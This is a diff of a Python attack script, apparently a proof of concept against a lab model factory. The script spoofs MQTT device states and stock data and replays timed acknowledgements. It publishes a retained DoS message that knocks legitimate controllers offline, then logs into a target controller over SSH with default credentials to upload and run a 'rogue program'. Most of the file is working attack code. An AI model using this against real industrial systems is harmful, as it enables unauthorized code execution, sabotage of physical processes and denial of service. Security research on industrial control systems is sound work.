@@ -1,16 +1,12 @@
 import re
 import time
 import threading
-import netfilterqueue
 from datetime import timezone, datetime
 import logging
 import json
-import subprocess
-import socket
 
 import paho.mqtt.client
 import paho.mqtt.client as mqtt
-import scapy.all as scapy
 import globs
 
 from paramiko import SSHClient
@@ -18,7 +14,7 @@ from paramiko.client import AutoAddPolicy
 from scp import SCPClient
 
 logger = logging.getLogger("attack_order")
-logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.DEBUG)
+logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)
 
 # First we define variables
 dst_ip = "192.168.0.10"
@@ -30,29 +26,33 @@ wp_location = None
 
 
 def second_attack():
-    logger.info("Starting file upload attack on 192.168.0.13")
-    # server = '192.168.0.13'
-    # port = 22
-    # username = password = 'ROBOPro'
-    #
-    # # create ssh object and connect
-    # ssh = SSHClient()
-    # ssh.load_host_keys('/home/kali/.ssh/known_hosts')
-    # ssh.set_missing_host_key_policy(AutoAddPolicy)
-    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    #
-    # # hijack the established tcp/ssh connection and copy files
-    # scp = SCPClient(ssh.get_transport())
-    # path = '/home/kali/fischer/vgr/C-Program/'
-    # # now copy the rogue program
-    # scp.put(f'{path}TxtParkPosVGR', '.')
-    #
-    # # now run the rogue program
-    # ssh.exec_command('./TxtParkPosVGR')
-    # time.sleep(7)
-    # ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
-    # ssh.exec_command('./TxtParkPosVGR')
-    # logger.info("Finished file upload attack on 192.168.0.13")
+    # # supress logging info from paramiko
+    logging.getLogger("paramiko").setLevel(logging.WARNING)
+    logger.info("Starting file upload attack on target VGR")
+    server = '192.168.0.13'
+    port = 22
+    username = password = 'ROBOPro'
+
+    # create ssh object and connect
+    ssh = SSHClient()
+    ssh.load_host_keys('/home/kali/.ssh/known_hosts')
+    ssh.set_missing_host_key_policy(AutoAddPolicy)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+
+    # hijack the established tcp/ssh connection and copy files
+    scp = SCPClient(ssh.get_transport())
+    path = '/home/kali/fischer/vgr/C-Program/'
+    # now copy the rogue program
+    scp.put(f'{path}TxtParkPosVGR', '.')
+    path2 = '/home/kali/fischer/vgr/Data/Config.ParkPos.json'
+    scp.put(f'{path2}', 'Data/')
+
+    # now run the rogue program
+    ssh.exec_command('./TxtParkPosVGR')
+    time.sleep(2)
+    ssh.connect(server, port, username, password, look_for_keys=False, allow_agent=False)
+    ssh.exec_command('./TxtParkPosVGR')
+    logging.info("Connected via SCP/SSH. Attack program uploaded and executed on target VGR.")
 
 # since threads cannot be restarted by calling the .start(), the workaround is to just pre-create 10 threads in a list
 threads_list = {'second_attack': [], 'manual_on_message_trigger': []}
@@ -81,26 +81,24 @@ def new_ts():
     return ts_
 
 
-def retrieve_from_stock(color, stock):
+def retrieve_from_stock(color: str, stock: str) -> str:
     global wp_id, wp_location
-    stock = stock.decode("utf-8")
+    # stock = stock.decode("utf-8")
 
-    data = json.loads(stock)
+    stock = json.loads(stock)
 
-    for item in reversed(data['stockItems']):
+    for item in reversed(stock['stockItems']):
         if item['workpiece'] and item['workpiece']['type'] == color:
             wp_location = item['location']
-            print("wp location is", wp_location)
             wp_id = item['workpiece']['id']
             item['workpiece'] = None
             break
 
-
-    updated_stock = json.dumps(data, indent=4).replace("    ", "\t").replace(": ", " : ")
+    updated_stock = json.dumps(stock, indent=4).replace("    ", "\t").replace(": ", " : ")
     updated_stock_with_ts = re.sub('"ts.*\n}', new_ts(), updated_stock)
 
     # since a bytes object gets passed into the function, we want to ensure a bytes object gets returned too
-    return updated_stock_with_ts.encode('utf-8')
+    return updated_stock_with_ts #.encode('utf-8')
 
 
 # what happens if a ConnAck packet is received? Then we subscribe
@@ -324,7 +322,6 @@ def on_publish(client, userdata, msgid, *rest):
             data = state(1, 2, "", "hbw")
             client.publish("f/i/state/hbw", data, qos=1)
 
-            # globs.state_hbw = "BUSY"
             # ----------------
             client.user_data_set(50)
 
@@ -390,7 +387,6 @@ def on_publish(client, userdata, msgid, *rest):
             data = state(1, 2, "", "hbw")
             client.publish("f/i/state/hbw", data, qos=1)
 
-            # globs.state_hbw = "BUSY"
             # ----------------
 
             client.user_data_set(59)
@@ -458,17 +454,17 @@ def on_publish(client, userdata, msgid, *rest):
             threads_list['second_attack'][thread_counter['second_attack']].join()
             thread_counter['second_attack'] += 1
 
-            #
             threads_list['manual_on_message_trigger'][thread_counter['manual_on_message_trigger']].join()
             thread_counter['manual_on_message_trigger'] += 1
 
-            globs.state_vgr = "NOT_BUSY"
 
             client.user_data_set(-1)
 
-            logger.info("First run of attack finished. Listening for order again.")
+            logger.info("First run of attack done. Now sending idle status information to user while listening for new order.")
+            globs.send_state_every_10_seconds_trigger = True
 
         case -1:
+            # Just a blackhole
             pass
 
         case "33d":
@@ -487,7 +483,7 @@ def on_publish(client, userdata, msgid, *rest):
             threads_list['second_attack'][thread_counter['second_attack']].start()
 
             client.user_data_set(44)
-            logger.info("Acknowledgement received from HBW with code 1")
+            logger.info('"Acknowledgement received from HBW with code 1"')
 
         case "60b":
             ## ----------------------
@@ -495,10 +491,8 @@ def on_publish(client, userdata, msgid, *rest):
             client.publish("f/i/state/mpo", data, qos=1)
             ## ----------------------
 
-            globs.state_mpo = "BUSY"
-
             client.user_data_set(61)
-            logger.info("Acknowledgement received from MPO with code 1 | MPO started")
+            logger.info('"Acknowledgement received from MPO with code 1 | MPO started"')
 
 
         case "75b":
@@ -507,15 +501,15 @@ def on_publish(client, userdata, msgid, *rest):
             client.user_data_set("75c")
 
         case "75c":
+            time.sleep(2)
+            
             ### ----------------------
             data = state(1, 2, "", "sld")
             client.publish("f/i/state/sld", data, qos=1)
             ### ----------------------
 
-            globs.state_sld = "BUSY"
-
             client.user_data_set(76)
-            logger.info("Acknowledgement received from MPO with code 2 | MPO ended & SLD started")
+            logger.info('"Acknowledgement received from MPO with code 2 | MPO ended & SLD started"')
 
 
         case "76b":
@@ -524,19 +518,17 @@ def on_publish(client, userdata, msgid, *rest):
             client.publish("f/i/state/sld", data, qos=1)
             ### ----------------------
 
-            globs.state_sld = "NOT_BUSY"
-
             client.user_data_set(77)
-            logger.info("Acknowledgement received from SLD with code 2 | SLD ended")
+            logger.info('"Acknowledgement received from SLD with code 2 | SLD ended"')
 
         case "dos_leg_clients":
             # now we DoS all the TXTs to disconnect them from broker
             # we have to do this so that the legitimate devices do not obstruct our replay tickets / offline attack
-            data = '{i command you to shut down}'
+            data = '70f11c4bfc1950f14ae8cf8d0800450000b231f44000400686eac0a8000dc0a8000a831a075bcf497a748c6e9d2f80180391640200000101080a00084a'
             # we publish and set as retain. This way, even if the TXTs come back online, they will immediate go offline
-            client.publish("fl/broadcast", data, qos=1, retain=True)
+            client.publish("f/o/state/ack", data, qos=1, retain=True)
 
-            logger.info("Legitimate clients now shut down")
+            logger.info("Broadcast attack done. Legitimate clients now shut down")
 
             threads_list['manual_on_message_trigger'][thread_counter['manual_on_message_trigger']].start()
             logger.info("Order received from Dashboard via broker")
@@ -545,19 +537,20 @@ def on_publish(client, userdata, msgid, *rest):
 
 def on_message(client, userdata, mqttmsg):
     global order_color
-    mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json
+    try:
+        mqttpayload = json.loads(mqttmsg.payload.decode('utf-8'))  # decode mqtt payload to string and convert to json
+    except Exception as error:
+        # an error gets raised because we receive the DoS mqtt message which json is unable to parse because obviously the DOS message is not JSON
+        pass
 
     if mqttmsg.topic == "f/i/stock" and not globs.is_stock_recorded:
-        globs.hbw_stock = mqttpayload
+        # convert the payload back to string since we are still going to be using it later. See retrieve_from_stock func and publish 10 seconds func
+        globs.hbw_stock = json.dumps(mqttpayload)
         globs.is_stock_recorded = True
-        print("stock received. your addition here seems to work")
 
     if mqttmsg.topic == "f/o/order":
+        globs.send_state_every_10_seconds_trigger = False
         globs.on_message_event_trigger = True
-
-        # set hbw to BUSY
-        globs.state_hbw = "BUSY"
-        globs.state_vgr = "BUSY"
 
         order_color = mqttpayload['type']
         logger.info("Ordered color is: " + order_color)
@@ -594,11 +587,7 @@ def on_message(client, userdata, mqttmsg):
 
         client.user_data_set("75b")
 
-        # for sure HBW should have finished it's process by now so:
-        globs.state_hbw = "NOT_BUSY"
-
     if mqttmsg.topic == "fl/sld/ack" and mqttpayload["code"] == 2:
-        globs.state_mpo = "NOT_BUSY"
         data = state(0, 1, "", "vgr", "dso")
         client.publish("f/i/state/vgr", data, qos=1)
 
@@ -606,52 +595,50 @@ def on_message(client, userdata, mqttmsg):
 
 
 def publish_state_10_seconds():
-    pass
-    # while globs.send_state_every_10_seconds_trigger is not True:
-    #     continue
-    #
-    # while globs.send_state_every_10_seconds_trigger is True:
-    #     if globs.state_vgr == "NOT_BUSY" or globs.state_vgr is None:
-    #         print("vgr state")
-    #         data = state(0, 1, "", "vgr", "hbw")
-    #         aa = mqtt_connect.publish("f/i/state/vgr", data, qos=1)
-    #         aa.wait_for_publish()
-    #         # time.sleep(5.5)
-    #
-    #
-    #     if globs.state_hbw == "NOT_BUSY" or globs.state_hbw is None:
-    #         print("hbw state")
-    #         # -----------------------
-    #         data = state(0, 1, "", "hbw")
-    #         mqtt_connect.publish("f/i/state/hbw", data, qos=1)
-    #
-    #         while globs.hbw_stock is None:
-    #             continue
-    #         data = globs.hbw_stock
-    #         bb = mqtt_connect.publish("f/i/stock", data, qos=1)
-    #         bb.wait_for_publish()
-    #         # -----------------------
-    #         # time.sleep(3.3)
-    #
-    #     if globs.state_mpo == "NOT_BUSY" or globs.state_mpo is None:
-    #         print("mpo state")
-    #         data = state(0, 1, "", "mpo")
-    #         cc = mqtt_connect.publish("f/i/state/mpo", data, qos=1)
-    #         cc.wait_for_publish()
-    #
-    #     if globs.state_sld == "NOT_BUSY" or globs.state_sld is None:
-    #         print("sld state")
-    #         data = state(0, 1, "", "sld")
-    #         dd = mqtt_connect.publish("f/i/state/sld", data, qos=1)
-    #         dd.wait_for_publish()
-    #
-    #     time.sleep(10)
+    while True:
+        if globs.send_state_every_10_seconds_trigger:
+            data = state(0, 1, "", "vgr", "hbw")
+            aa = mqtt_connect.publish("f/i/state/vgr", data, qos=1)
+            mqtt_connect.user_data_set(-1)
+            while not aa.is_published():
+                continue
+
+            # -----------------------
+            data = state(0, 1, "", "hbw")
+            bb = mqtt_connect.publish("f/i/state/hbw", data, qos=1)
+            mqtt_connect.user_data_set(-1)
+            while not bb.is_published():
+                continue
+
+            while globs.hbw_stock is None:
+                continue
+            data = globs.hbw_stock
+            cc = mqtt_connect.publish("f/i/stock", data, qos=1)
+            mqtt_connect.user_data_set(-1)
+            while not cc.is_published():
+                continue
+
+            data = state(0, 1, "", "mpo")
+            dd = mqtt_connect.publish("f/i/state/mpo", data, qos=1)
+            mqtt_connect.user_data_set(-1)
+            while not dd.is_published():
+                continue
+
+            data = state(0, 1, "", "sld")
+            ee = mqtt_connect.publish("f/i/state/sld", data, qos=1)
+            mqtt_connect.user_data_set(-1)
+            while not ee.is_published():
+                continue
+
+            time.sleep(10)
 
 """Dictionary that contains a list of the respective times it takes for each WP (depending on its location on the HBW shelf)
  to transit from the end of (fetching WP from) HBW, to the start of MPO, to end of MPO, and finally to the start SLD.
  Each workpiece will have different times"""
 # template is {"workpiece location": ["hbw/ack", "mpo/ack code 1", "mpo/ack code 2", "sld/ack"]}
-dict_ = {"B2": [35, 57, 103, 112], "C1": [27, 49, 95, 104], "C3": [42, 64, 110, 119], "B1": [27, 49, 95, 102], "A1": [27, 49, 95, 102]}
+dict_ = {"A1": [27, 49, 95, 104], "A2": [34, 57, 103, 114], "A3": [42, 64, 110, 120],
+         "B1": [27, 50, 96, 105], "B2": [35, 57, 103, 112], "B3": [41, 63, 107, 117],
+         "C1": [27, 49, 95, 104], "C2": [35, 58, 104, 113], "C3": [42, 64, 110, 119]}
 # we simply need to add more locations and times to the above dict after analysing/recording more packets. B1 and A1 are simply dups of C1 for POC sake
 
 def manual_on_message_trigger():
@@ -700,7 +687,7 @@ for i in range(10):
         threads_list['manual_on_message_trigger'].append(thread_manual_on_message_trigger)
 
 
-mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
+mqtt_connect = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id='TxtFactoryVGRV0.8.!', clean_session=True, protocol=mqtt.MQTTv31, userdata=0)
 mqtt_connect.max_queued_messages_set(2)
 mqtt_connect.max_inflight_messages_set(1)
 mqtt_connect.username_pw_set('txt', 'xtx')  # turns out connection happens without username/password
